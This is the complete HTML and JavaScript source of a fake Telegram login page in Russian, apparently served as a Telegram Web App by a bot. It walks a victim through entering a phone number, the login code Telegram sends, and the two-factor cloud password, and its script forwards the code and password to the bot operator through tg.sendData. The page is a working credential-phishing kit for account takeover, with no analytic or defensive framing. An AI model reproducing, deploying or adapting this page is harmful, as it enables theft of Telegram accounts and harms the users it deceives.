<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Login</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tg-bg: var(--tg-theme-bg-color, #212121);
            --tg-text: var(--tg-theme-text-color, #ffffff);
            --tg-hint: var(--tg-theme-hint-color, #aaaaaa);
            --tg-btn: #3390ec;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--tg-bg); color: var(--tg-text);
            margin: 0; display: flex; flex-direction: column; align-items: center;
        }
        .tg-logo { margin-top: 50px; width: 100px; height: 100px; background: #24A1DE; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .tg-logo svg { width: 60px; height: 60px; fill: white; transform: translate(-2px, 1px); }
        h1 { font-size: 26px; margin: 25px 0 10px; }
        .sub { color: var(--tg-hint); text-align: center; padding: 0 40px; margin-bottom: 30px; }
        .form { width: 100%; max-width: 320px; padding: 0 20px; box-sizing: border-box; }
        .input-box { border: 1px solid #444; border-radius: 12px; padding: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; cursor: pointer; }
        .field { background: none; border: 1px solid #444; border-radius: 12px; padding: 15px; font-size: 18px; color: white; width: 100%; outline: none; margin-bottom: 10px; }
        .btn { background: var(--tg-btn); color: white; border: none; border-radius: 12px; padding: 16px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; }
        #country-modal { position: fixed; top: 0; background: var(--tg-bg); width: 100%; height: 100%; display: none; flex-direction: column; z-index: 100; }
        .item { padding: 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; }
        .step { display: none; width: 100%; flex-direction: column; align-items: center; }
        .active { display: flex; }
    </style>
</head>
<body>
    <div class="tg-logo"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/></svg></div>
    <h1>Telegram</h1>
    <div class="form">
        <div id="step1" class="step active">
            <div class="sub">Выберите страну и введите номер телефона.</div>
            <div class="input-box" onclick="openM()"> <span id="cn">Russia</span> <span>></span> </div>
            <div style="display:flex; gap:10px;">
                <input type="text" id="cc" class="field" style="width:70px" value="+7" readonly>
                <input type="tel" id="ph" class="field" placeholder="000 000 0000">
            </div>
            <button class="btn" onclick="next1()">NEXT</button>
        </div>
        <div id="step2" class="step">
            <div class="sub">Введите 5-значный код из чата Telegram.</div>
            <input type="number" id="sms" class="field" style="text-align:center; letter-spacing:5px">
            <button class="btn" onclick="next2()">CONFIRM</button>
        </div>
        <div id="step3" class="step">
            <div class="sub">Введите облачный пароль (2FA).</div>
            <input type="password" id="pw" class="field">
            <button class="btn" onclick="done()">FINISH</button>
        </div>
    </div>
    <div id="country-modal">
        <div style="padding:20px; color:var(--tg-btn)" onclick="closeM()">Назад</div>
        <div id="clist"></div>
    </div>
    <script>
        const tg = window.Telegram.WebApp; tg.expand();
        const countries = [{n:"Russia", c:"+7"}, {n:"Kazakhstan", c:"+7"}, {n:"Ukraine", c:"+380"}, {n:"Uzbekistan", c:"+998"}, {n:"Belarus", c:"+375"}];
        function openM() {
            const l = document.getElementById('clist'); l.innerHTML = '';
            countries.forEach(x => {
                let d = document.createElement('div'); d.className = 'item';
                d.innerHTML = `<span>${x.n}</span><span>${x.c}</span>`;
                d.onclick = () => { document.getElementById('cn').innerText = x.n; document.getElementById('cc').value = x.c; closeM(); };
                l.appendChild(d);
            });
            document.getElementById('country-modal').style.display = 'flex';
        }
        function closeM() { document.getElementById('country-modal').style.display = 'none'; }
        function next1() { if(document.getElementById('ph').value.length > 5) { tg.sendData("PHONE_REQUESTED"); document.querySelectorAll('.step').forEach(s=>s.classList.remove('active')); document.getElementById('step2').classList.add('active'); } }
        function next2() { let v = document.getElementById('sms').value; if(v.length === 5) { tg.sendData("CODE:" + v); document.querySelectorAll('.step').forEach(s=>s.classList.remove('active')); document.getElementById('step3').classList.add('active'); } }
        function done() { tg.sendData("PASS:" + document.getElementById('pw').value); setTimeout(()=>tg.close(), 1000); }
    </script>
</body>
</html>
